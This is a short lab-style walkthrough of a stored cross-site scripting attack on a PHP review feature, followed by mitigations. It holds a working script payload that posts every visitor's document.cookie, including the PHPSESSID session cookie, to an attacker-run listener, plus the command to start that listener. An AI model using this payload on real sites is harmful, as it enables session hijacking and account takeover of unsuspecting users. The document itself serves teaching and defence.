# Get cookies of all users

This attack will exploit the reviews to grab the cookie of any user that visits the homepage.

## Steps

- Listen on your machine for connections

    `docker run -it --rm --name node-logger -p 8000:8000 -v ${PWD}:/usr/src/app -w /usr/src/app node:alpine node logger.js`

- Register an user on the website and login
- Create a review and inject malicious javascript code 

    ```javascript
    <script>
        fetch("http://127.0.0.1:8000", {
            method:'POST', 
            mode: 'no-cors', 
            body: document.cookie
        })
    </script>
    ```

- Every time a logged in user visits the homepage you receive their PHPSESSID cookie

## Mitigation

- Sanitize sent and received data [htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php) function
- Use appropriate response headers
- Use Content Security Policy
